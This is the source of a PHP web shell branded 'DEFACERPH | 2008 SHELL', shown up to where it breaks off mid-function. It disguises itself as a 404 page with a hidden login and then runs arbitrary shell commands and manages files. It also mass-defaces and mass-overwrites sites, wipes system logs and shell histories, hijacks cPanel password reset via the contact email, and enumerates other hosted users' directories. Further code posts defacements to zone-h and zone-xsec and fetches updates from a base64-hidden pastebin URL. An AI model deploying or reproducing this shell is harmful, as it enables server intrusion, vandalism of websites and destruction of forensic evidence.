<?php
if($_POST["opt"] == "download"){
$file = $_POST["path"];
header('Content-Type: application/octet-stream');  
header("Content-Transfer-Encoding: Binary");   
header("Content-disposition: attachment; filename=\"".basename($file)."\"");   
readfile($file);
exit();
}
http_response_code("404");
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set("Asia/Manila");
if($_GET["path"]){
$dir = $_GET["path"];
}else{
	$dir = getcwd();
}
$ip = getHostByName(getHostName());
$ver = phpversion();
$web = $_SERVER['HTTP_HOST'];
$sof = $_SERVER['SERVER_SOFTWARE']; 
$mysql = (function_exists('mysql_connect')) ? "<font color=lime size=1>ON</font>" : "<font color=red size=1>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime size=1>ON</font>" : "<font color=red size=1>OFF</font>";
$mail = (function_exists('mail')) ? "<font color=lime size=1>ON</font>" : "<font color=red size=1>OFF</font>";
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers =  (int) ($free/$total*100);
$ds = @ini_get("disable_functions");
if(empty($ds)){
$ds = "<font color=lime size=1>NONE</font>";
}
function pathh($path){
if(isset($path)){
$path = $path;
echo $path;
}else{
$path = getcwd();
echo $path;
}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
$uname = 'DEFACERPHSHELL';
$pass = '2008';
if(!isset($_SESSION['uname']) OR $_SESSION['uname'] != $uname){
$login = '
<head>
<title>404 Not Found</title>
<style>.input{border:0;color:black;background-color:white;}.inputbtn{border:0;color:white;background-color:white;}</style></head>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<center><form method="POST">
<input type="text" class="input" name="uname">
<input type="text" class="input" name="pass">
<input type="submit" class="inputbtn" name="login">
</form></body></html>';
 }
if(isset($_POST['login'])){
if($_POST['uname'] !== $uname || $_POST['pass'] !== $pass){
}else{
$_SESSION['uname'] = $_POST['uname'];
}}
if($_SESSION['uname'] === $uname){
?>
<!DOCTYPE HTML>
<html>
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />
<head>
<link rel="shortcut icon" href="https://i.ibb.co/rFtRxnk/dph-removebg-preview.png" type="image/jpg"> 
<body bgcolor="black"><center>
	


<link href="" rel="stylesheet" type="text/json_decode">
<title>~[ DEFACERPH | 2008 SHELL ]~</title>
<style>
	
body{
background-colour: yellow;
}
.e{
	color: black;
	background-color: black;
	
}
.v{
	color: black;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 12px #fff;
}
#defacer{
width:300px;
background:black;
border:solid 2px red;
color:lime;
}
#domains{
background:black;
border:2px #15d6c8 solid;
color: blue;
}
.cmd{
	width: 50%;
	border:2px #15d6c8 solid;
	color: lime;
}
hr{
  border: 3px dashed red;
  
}
#content .first{
background-colour: red;
}
table{
border: 2px #15d6c8 solid;
}
textarea{
width: 50%;
height: 50%;
}
.error{
			color: red;
			font-size: 30;
}
.success{
			color: #00FF49;
			font-size: 30;
}
a{
color:red;
text-decoration: iceland;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea,button{
border: 2px #15d6c8 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
	</center>
	</center>
<font color="white" size="1">Uname: </font><font color="red" size="1"><?=php_uname();?></font>
<br><font color="white" size="1">Domain: </font><font color="red" size="1"><?=$web;?></font><font color="white" size="1"> Server IP: </font><font color="red" size="1"><?=$ip;?></font><br>
<font color="white" size="1">Sofware: </font><font color="red" size="1"><?=$sof;?></font><br><font color="white" size="1"> Version: </font><font color="red" size="1"><?=$ver;?></font><font color="white" size="1"> Mail: </font><?=$mail ;?><font color="white" size="1"> Curl: </font><?=$curl;?> <font color="white" size="1">Mysql: </font><?=$mysql;?>
<br><font color="white" size="1">Disabled_functions: </font><font color="red" size="1"><?=$ds;?></font>
<font color="white" size="1">Whoami: </font><font color="red" size="1">   <?=exe("whoami");?></font>
 <center> <center>
     <center><br><br>
    	<a href="<?=$_SERVER['PHP_SELF'];?>"><img border='0' alt="Defacerph Logo" src='https://i.ibb.co/rFtRxnk/dph-removebg-preview.png' height='290' width='300'></a>
      </center>
   <h5><font color="white">DEFACERPH | 2008 </h5>
    <div class="greetings">
 </div><br>
       <br><br>
    <font size="2"><a href="?masszone">Mass Zone - H</a> ~ <a href="?masszone2">Mass Zone-Xsec</a> ~ <a href="?massdeface&path=<?php pathh($_GET['path']); ?>">Mass Deface</a> ~ <a href="?defall&path=<?php pathh($_GET['path']); ?>">Mass Edit File</a> ~ <a href="?cpr">CPanel</a> ~ <a href="?dmns">Domains</a> ~ <a href="?jump">Jumping</a> ~  <a href="?massbackdoor">Mass Backdoor</a> ~ <a href="?delelogs">Delete Logs</a> ~ <a href="?updateme">Update me!</a> ~ <a href="?multicheckstatus">CheckStatus</a> ~ <a href="?phpinfo">PHP Info</a> ~ <a href="?killme">Kill me!</a></font>
   <br><br>
 <?php
$notavail = "<font color='red'><h1>Available Soon!</h1></font>
<br>
<font color='red' size='6'>
For more updates do pm me.
<br>
</font>
<br>
<button><a href='https://www.facebook.com/johndelacruzcw'>Contact</a></button>
";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

if( $_POST['_upl'] == "Upload" ){
	$fname = $_FILES['file']['name'];
	$fdir = $_POST['dir'];
	$total = $_POST['patch'].'/'.$fname;
	if(@copy($_FILES['file']['tmp_name'],$path.'/'.$total)){
		$fname = $_FILES['file']['name'];
	//	echo $_FILES['file']['tmp_name'];

//		$runs = $path.'/'.$fname;
		$success = "Uploaded!";
		$status = $success;
		}else{
		$failed = 'Error!';
		$status = $failed;
	}
}

echo '<table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Path : ';
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
		
	$scandir = scandir($path);
}
}

?>
<?php
if($_POST["path"] && $_POST["chmods"]){
	$chmods = $_POST["chmods"];
	chmod($_POST["path"], $chmods);
	exe("chmod ".$chmods." ".$_POST["path"]);
	$status = "Permission Changed!";
}
if($_POST['ndir'] && $_POST['path']){
$ndir = $_POST["ndir"];
mkdir($_POST['path'].'/'.$ndir);
echo "<div class='success'>";
$status = "Directory Saved!";
echo "</div>";
}
if($_POST['code'] && $_POST['path']){
$a = $_POST['code'];
$file = @fopen($_POST['path'].'/'.$_POST['file'],'w');
@fwrite($file,$a); @fclose($file);
echo "<div class='success'>";
$status = "File Created!";
echo "</div>";
}else{
}

if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo "<div class='success'>";
$status = 'Deleted!';
echo "</div>";
}else{
echo "<div class='error'>";
$status = "Error!";
echo "</div>";
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo "<div class='success'>";
$status = 'Deleted!';
echo "</div>";
}else{
echo "<div class='error'>";
$status = 'Error!';
echo "</div>";
}
}
}
if(isset($_POST['path']) && isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
$status = 'Renamed! ';
}else{
$status = 'Error!';
}}
if(isset($_POST['path']) && isset($_POST['newfdate'])){
if(touch($_POST['path'], strtotime($_POST['newfdate']))){
$status = 'Touched! ';
}else{
$status = 'Error!';
}
}
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo "<div class='success'>";
touch($_POST['path'], strtotime($_POST['fdate']));
$status = 'Saved!';
echo "</div>";
}else{
echo "<div clas='error'>";
$status = 'Error!';
echo "</div>";
}
fclose($fp);
}?>
<?php
if($status === "Error!"){
	if(!empty($status)){
echo "<div class='error'>";
echo "Status: $status";
echo "</div>";
}
}else{
	if(!empty($status)){
echo "<div class='success'>";
echo "Status: $status";
echo "</div>";
}
}
echo "</p>";
if(isset($_POST["path"]) && $_POST["newf"] == "folder"){
echo '<form method="POST">
<label>Directory Name: </label>
<input type="hidden" name="path" value="'.$path.'">
<input type="text" name="ndir"/>
<input type="submit" name="save" value="Save!"/>
</form>';
	}elseif($_POST["path"] && $_POST["opt"] == "chmod" && $_POST["name"]){
	$chmodper = $_POST["chmodper"];
	$name = $_POST["name"];
	echo '<form method="POST">
<label>Chmod: </label>
<input type="hidden" name="path" value="'.$path.'/'.$name.'">
<input type="text" name="chmods" value="'.$chmodper.'"/>
<input type="submit" name="save" value="Save!"/>
</form>';
	
}elseif($_POST['opt'] == 'rename'){
if($_POST["name"] == ""){
$_POST["name"] = $_POST["newname"];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
&nbsp;
<input type="submit" value="Save" />
</form>';
echo "<br/>";
}elseif($_POST['opt'] == 'touch'){
echo '<form method="POST">
Touch : <input name="newfdate" type="text" size="20" value="'.$_POST['fdate'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
&nbsp;
<input type="submit" value="Save" />
</form>';
echo "<br/>";
}else{}


?>
</td></tr><tr><td><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<input type="hidden" name="path" value="<?=$path;?>">
<input type="hidden" name="dir" value="<?=$dir;?>">
<input type="file" class="" name="file" size="50">
&nbsp;
<input name="_upl" type="submit" class="btn" id="_upl" value="Upload"></form>
<?$status;?>

</td></tr>
<td><?php echo'
<form method="POST">
Execute: <input name="cmd" type="text" size="20" />
<input type="hidden" name="path" value="'.$path.'">
&nbsp;
<input type="submit" name="run" value="Run" />
</form>';?></td></table><br/>
<?php
if(isset($_POST["path"]) && $_POST["newf"] == "file"){
	echo '<form method="POST">
<label for="input">Filename: </label>
<input id="input"type="text" name="file" placeholder="">
<br>
<br>
<input type="hidden" name="path" value="'.$path.'">
<textarea cols=80 class="textarea" rows=20 name="code" placeholder="">
</textarea><br> <input type="submit"  name="Save" value="Save">
</form>';
}elseif($_POST['opt'] == 'edit'){
$fname = $_POST["name"];
echo "<br/>
Filename: <font color='red'>$fname</font>
</br><br/>
<center>
<form method='POST'>
<input name='name' type='hidden' value='$fname'/>";
echo '
<textarea cols=80 class="textarea" rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="fdate" value="'.$_POST['fdate'].'">
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<br/>
<input type="submit" value="Save" />
</form>';
echo "<br/></center>";
}elseif(isset($_GET["phpinfo"])){
	echo phpinfo();
}elseif(isset($_GET["dmns"])){
echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
}elseif(isset($_GET["delelogs"])){
echo "<center><h2>Delete Logs</h2>";
	exe("rm -rf /tmp/logs");
	exe("rm -rf /root/.ksh_history");
	exe("rm -rf /root/.bash_history");
	exe("rm -rf /root/.bash_logout");
	exe("rm -rf /usr/local/apache/logs");
	exe("rm -rf /usr/local/apache/log");
	exe("rm -rf /var/apache/logs");
	exe("rm -rf /var/apache/log");
	exe("rm -rf /var/run/utmp");
	exe("rm -rf /var/logs");
	exe("rm -rf /var/log");
	exe("rm -rf /var/adm");
	exe("rm -rf /etc/wtmp");
	exe("rm -rf /etc/utmp");
	exe("rm -rf /var/log/lastlog");
	exe("rm -rf /var/log/wtmp");
	sleep(1);
	echo'<br><p>Deleting .../tmp/logs </p>';
	sleep(1);
	system("rm -rf /root/.bash_history");
	sleep(1);
	echo'<p>Deleting .../root/.bash_history </p>';
	system("rm -rf /root/.ksh_history");
	sleep(1);
	echo'<p>Deleting .../root/.ksh_history </p>';
	system("rm -rf /root/.bash_logout");
	sleep(1);
	echo'<p>Deleting .../root/.bash_logout </p>';
	system("rm -rf /usr/local/apache/logs");
	sleep(1);
	echo'<p>Deleting .../usr/local/apache/logs </p>';
	system("rm -rf /usr/local/apache/log");
	sleep(1);
	echo'<p>Deleting .../usr/local/apache/log </p>';
	system("rm -rf /var/apache/logs");
	sleep(1);
	echo'<p>Deleting .../var/apache/logs </p>';
	system("rm -rf /var/apache/log");
	sleep(1);
	echo'<p>Deleting .../var/apache/log </p>';
	system("rm -rf /var/run/utmp");
	sleep(1);
	echo'<p>Deleting .../var/run/utmp </p>';
	system("rm -rf /var/logs");
	sleep(1);
	echo'<p>Deleting .../var/logs </p>';	
	system("rm -rf /var/log");
	sleep(1);
	echo'<p>Deleting .../var/log </p>';
	system("rm -rf /var/adm");
	sleep(1);
	echo'<p>Deleting .../var/adm </p>';
	system("rm -rf /etc/wtmp");
	sleep(1);
	echo'<p>Deleting .../etc/wtmp </p>';
	system("rm -rf /etc/utmp");
	sleep(1);
	echo'<p>Deleting .../etc/utmp </p>';
	system("rm -rf /var/log/lastlog");
	sleep(1);
	echo'<p>Deleting .../var/log/lastlog </p>';
	system("rm -rf /var/log/wtmp");
	sleep(1);
	echo'<p>Deleting .../var/log/wtmp </p>';
	sleep(4);
	echo '<br><p>Congratulations! Logs deleted successfully.</p><br></center>';
}elseif(isset($_GET["cpr"])){
echo '<center><h2>Cpanel Reset Password</h2><div style="border-radius: 6px;padding: 4px 2px;width: 24%;line-height: 24px;background: #1E1E1E;color:white;"><p>
<form action="#" method="post">Email: <input type="email" name="email" style="background-color: white;color:#1E1E1E;" /><input type="submit" name="submit" value="Send!" style="style="border-radius: 6px;font: 9px; color:#1E1E1E;"/></form><br></p></div></center>';
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');
if(isset($_POST['submit'])){
$email = $_POST['email'];
$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>'; }
}elseif(isset($_GET["jump"])){
$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$url_user'><font color=#B0B0B0>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$url_user'><font color=#B0B0B0>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In -> ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$web_vh'><font color=#B0B0B0>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$web_vh'><font color=#B0B0B0>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In ->  di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=#B0B0B0>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=#B0B0B0>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $myuser_jump) {
					$user_jumping_dir = "/home/$myuser_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$user_jumping_dir'><font color=#B0B0B0>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$user_jumping_dir'><font color=#B0B0B0>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=#B0B0B0>Cannot retrieve the domain name</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $myuser_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In -> ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}
elseif(isset($_GET["masszone2"])){
echo '<center>';
    echo '<br>';
    echo '<h1>Zone-Xsec <font color=red>Notifier</font></h1>';
    echo '<br>';
    echo '<form method="post" action="" enctype="multipart/form-data">
<b>Defacer :</b><br>
<input class="inputz" size="40" height="10" type="text" name="defacer" value="" placeholder="ph.mikey">
<br><b>Team :</b><br>
<input class="inputz" size="40" height="10" type="text" name="team" placeholder="Defacer PH." value="">
<br><b>List Site :</b><br>
<textarea cols="40" rows="10" placeholder="http://site.com/" name="sites"></textarea>
<br>
<br>
<input  class="inputz" type="submit"  name="go" value="Mirror!">';
    echo '</form>';
    echo '</center>';
    if(isset($_POST['go'])) {
            $zh = $_POST["sites"];
            $form_url = "https://zone-xsec.com/notify";
            $data_to_post = array();
            $data_to_post['attacker'] = $_POST["defacer"];
            $data_to_post['team'] = $_POST["team"];
            $data_to_post['poc'] = '30';
            $data_to_post['reason'] = '7';
            $data_to_post['urls'] = $_POST["sites"];
            $data_to_post['mirror'] = "submit";
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $form_url);
            curl_setopt($curl, CURLOPT_POST, sizeof($data_to_post));
            curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13'); SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data_to_post);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            $result = curl_exec($curl);
            $result = preg_split("/Results/",$result);

$result = '<a href="javascript:R(1);X(1)" id="x1">Results'.$result[1];
$result = str_replace('<div id="copyresult"></div>',"",$result);
$result = preg_split('/<script async src="https:/',$result);
echo $result[0];
            curl_close($curl);
            echo "<br>";
    }
}
elseif(isset($_GET["masszone"])){
if($_POST['zonenow']) {
echo '<center>';
		$domain = explode("\r\n", $_POST['url']);
		$defacer =  $_POST['defacer'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$defacer/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$defacer/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$defacer' target='_blank'>http://www.zone-h.org/archive/notifier=$defacer</a><br><br>";
		function zoneh($url,$defacer) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$defacer&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$defacer);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color='lime'>OK</font><br>";
			} else {
				echo "$url -> <font color='red'>ERROR</font><br>";
			}
		}
	} else {
print'
<form method="POST">
<h2>{L337_Name}</h2>
<input id="defacer" type="text" name="defacer" placeholder="CodeName"><br><br>
<textarea id="domains" cols="50px" rows="10px" name="url" placeholder="http://target.com/def.htm&#10;http://target.com/def.txt"></textarea>
<br>
<input name="zonenow" value="Mass" type="submit">
</form>';
	}
	echo "</center><br>";
}elseif(isset($_POST["cmd"]) && $_POST["run"] && $_POST["path"]){
echo "<div class='cmd'>
<pre>";
$cmd = $_POST["cmd"];
	echo exe("cd $path && $cmd");
	//echo "cd $path && $cmd";
	echo"</div>";
}elseif(isset($_GET["massdeface"]) && $_GET["path"]){
echo "<center><form method='POST'>";
echo "<h1><font color='red'>Mass Deface</font></h1>";
echo "<font color='white'>Target Folder</font><br>
<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000;' name='base_dir' value='".$_GET["path"]."'><br><br>";
echo "<font color='white'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='filena' value='mikey.txt'><br><br>";
echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;' name='index'></textarea><br>";
echo "<input type='submit' value='Mass !!!'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['filena'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<hr color='lime'>>> <font color='lime'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
                }
        endforeach;
}
}elseif(isset($_GET["filesrc"])){
	$viewf = htmlspecialchars(file_get_contents($_GET["filesrc"]));
	echo "<font color='white' size='2'>".$_GET["filesrc"]."</font><br><textarea cols='60' rows='40' style='color:lime;background-color:#000000;' readonly>".$viewf."</textarea><br>";
}elseif(isset($_GET["killme"])){
	$tobekilled = getcwd().$_SERVER['PHP_SELF'];
	exe("rm -rf ".$tobekilled);
	unlink(basename($tobekilled));
	echo "Killed, Bye bye!";
}elseif(isset($_GET["defall"]) && $_GET["path"]){
echo "<center><form method='POST'>";
echo "<h1><font color='red'>Mass Edit File</font></h1>";
echo "<font color='white'>Target Folder</font><br>
<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000;' name='current_dir' value='".$_GET["path"]."'><br><br>";
echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;' name='index'></textarea><br>";
echo "<input type='submit' value='Mass !!!'></form></center>";
 
if (isset ($_POST['current_dir'] )) 
{
	if (!file_exists ($_POST['current_dir']))
                die ("<font color='red'><hr>".$_POST['current_dir']." Not Found !<br>");
  
        if (!is_dir ($_POST['current_dir']))
                die ("<font color='red'><hr>".$_POST['current_dir']." Is Not A Directory !</font><br>");
 
        @chdir ($_POST['current_dir']) or die ("<font color='red'><hr>Cannot Open Directory</font>");
$datas = base64_encode($_POST['index']);
$pathtodef = $_POST['current_dir'];
$ptfile = (glob($pathtodef));
function wew($ptfile, $datas){
foreach($ptfile as $ptfile){
if(is_file($ptfile)){
if(basename($ptfile) != ".htaccess" && basename($ptfile) != basename($_SERVER["PHP_SELF"]) && basename($ptfile) != "php.ini" && basename($ptfile) != "robot.txt"){
if (file_put_contents($ptfile, base64_decode($datas))){
       echo "<hr color='lime'>>> <font color='lime'>$ptfile&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
}else{
	echo "<hr color='red'>>> <font color='red'>$ptfile&nbsp&nbsp&nbsp&nbsp</font><font color='red'>(&#10003;)</font>";
}
}
}
if(is_dir($ptfile)){
$ptfile = (glob("$ptfile/*"));
wew($ptfile, $datas);
}
}
}
}

/* To run the function */
wew($ptfile, $datas);


}elseif(isset($_GET["multicheckstatus"])){?>
<h2>Multi Check Status</h2>
<textarea id="sites" name="sites" rows="20" cols="80" placeholder="site.com
site.com
site.com">
</textarea><br>
<button type="button" onclick="loadDoc()">Check</button>

<p>Results: <p id="demo"></p></p>

<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      response = this.responseText
      document.getElementById("demo").innerHTML = response;
    }
  };
  sites = document.getElementById("sites").value;
  data = `verify=True&sites=${sites}`
  xhttp.open("POST", "index.php?multicheckstatus", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send(data);
}
</script>
<?php
if($_POST["verify"]){
if($_POST["sites"]){
$sites = explode("\n",$_POST["sites"]);
foreach($sites as $site){
if(!empty($site)){
$ch = curl_init($site);
$headers = array(
   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
);
curl_setopt($ch, CURLOPT_HEADER, $headers);    // we want headers
curl_setopt($ch, CURLOPT_NOBODY, true);    // we don't need body
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$output = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if($httpcode != 0){
echo "<font color='green'>".$site." ".$httpcode." </font><br>";
}else{
echo "<font color='red'>".$site." Dead </font><br>";
}
}
}
}else{
echo "<font color='red'>Empty!</font>";
}
exit();
}
}
elseif(isset($_GET["updateme"])){
$urldefacerph = base64_decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZmdEZkQlJm");
$upname = basename($_SERVER["PHP_SELF"]);
$urldefacerph = base64_decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZmdEZkQlJm");
$upname = basename($_SERVER["PHP_SELF"]);
if(function_exists('curl_version')){
$ch = curl_init($urldefacerph);
curl_setopt($ch, CURLOPT_HEADER, true);    // we want headers
curl_setopt($ch, CURLOPT_NOBODY, true);    // we don't need body
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$output = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if($httpcode == 200){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urldefacerph);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$updata = curl_exec($ch);
curl_close($ch);
